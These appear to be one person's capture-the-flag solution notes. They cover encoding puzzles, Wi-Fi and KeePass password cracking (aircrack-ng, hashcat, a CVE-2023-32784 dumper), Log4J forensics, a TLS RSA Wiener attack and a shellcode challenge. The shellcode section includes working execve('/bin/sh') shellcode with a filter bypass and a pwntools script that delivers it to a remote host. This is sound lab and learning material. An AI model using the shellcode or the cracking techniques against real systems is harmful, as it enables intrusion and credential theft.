# start-enc

Decode the given text from binary, then base64, then html special char codes, then hex and you'll get the flag.

# easy-hide

Use bulk_extractor to obtain the embedded files. We'll get a broken jpg, use any online tool to repair it and get the flag.

# fake-add

Easy operations. Open the binary in Ghidra/IDA, and create a small Python script that'll recreate all operations present there.

# wifibasic

We can use aircrack-ng with the .cap file to break the target ssid using rockyou.txt wordlist.

# safe-password

For this, we need to check haveibeenpwned for the given passwords. You can automate it, or try it manually with the last 50 passwords (as the first 100 passwords seem secure; if the last 50 didn't work you could jump to them, but they'll work).

# password-manager-is-a-must

Unfortunately, debugging that dump doesn't yield anything. 

Doing more research, I've ended up here: `https://www.linkedin.com/pulse/steal-keepass-2x-254-master-password-chance-johnson/` => `https://github.com/vdohney/keepass-password-dumper`, which abuses `CVE-2023-32784`.
However, the program above fails to get all characters of the password, but we can use hashcat for that.

```Bash
keepass2john Database.kdbx > keepasshash
cut -d ":" keepasshash -f 2 > hash_only
hashcat -m 13400 hash_only -a 3 -1 ?l ?l<PASSWORD FROM THE TOOL> -O # (tries lowercase letters, it can be switched for others)
# if not, try with more letters
hashcat -m 13400 hash_only -a 3 -1 ?l?l ?l?l<PASSWORD FROM THE TOOL> -O
```

# secrets-of-winter

Last 3 words of the flag are obtained by decoding base64 tags obtained from exiftool.
First 3 words are obtained by carefully analyzing the image (left side building, right below where the roof starts, near the corner of the building).

# wifiland

Break Wi-Fi password for wifiland just as in the wifibasic challenge (`aircrack-ng PCAP_FILE -w WORDLIST`), then use that password in wireshark to decrypt packets (`Edit->Preferences->Protocols->802.11->wpa-pwd = PWD:SSID`).

# intro-to-assembly

Challenge requires us to build some shellcode, with some restraints however. We cannot use bytes 0x31 (part of XOR opcode), 0x0f and 0x05 (together they form the syscall opcode). Also, we can use a maximum of 24 bytes.
The challenge uses `strlen` to determine the size of the input, and it'll check the input up to that value. However, as `strlen` stops at 0x00, we can trick it by having some 0x00 bytes early on, thus allowing us to use the restricted characters.

Use the linux x64 syscall table to see how the parameters are for our syscalls (`execve`), and prepare a shellcode that'll do just do, effectively calling `execve("/bin/sh", NULL, NULL);`.
Inspiration: `https://pentesterslife.blog/2018/01/13/polymorphic-and-smaller-versions-of-three-shell-storms-x64-shellcodes-including-the-smallest-execve-bin-sh/`

```AS
global _start
section .text
_start:
	push 59 ; execve syscall
	pop rax
	cdq ; sign extend
	push rdx
	mov rbx, "/bin/sh"
	push rbx
	push rsp
	pop rdi ; addr for "/bin/sh"
	push rdx
	push rdi
	push rsp
	pop rsi
	syscall
```

Compile that shellcode using `nasm -felf64 shellcode.asm && ld -melf_x86_64 shellcode.o -o shellcode`, get the shellcode (`xxd shellcode`) and use pwntools to send it to the target binary.

```Python
from pwn import *
payload = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
#p = process("./intro-to-assembly")
#gdb.attach(p)
p = remote("34.107.38.170", 30745)
p.sendline(payload)
p.interactive()
```

# something-happened

For observing the compromised IP and attack, go towards the end of the data in the `something-happened*` index, and see the attack use (parameters containing jndi://ldap -> Log4J).
For the user-agent, it is Mozilla, dw abt that, I had to try all of them since the ones used in the attack didn't work and I was going insane.

# traffic-e

Obtain the server's RSA key from the TLS handshake.

Use the previously obtained key in RsaCtfTool -> RSA Wiener attack is successfull in getting the private key.

Use the newly obtained private key in wireshark (`Edit->Preferences->Protocols->TLS->RSA Keys->Edit->New - add servers ip and port, protocol would be http and then add the private key file`).
Then, look at the `Application Data` packets in the PCAP and go to the `Decrypted TLS` tab and get the flag.


# small tip for future me

Use `ffuf` instead of `wfuzz` for bruteforcing, way faster and less buggier!!
Also, fuzz the fkin websites when doing ANY web challs...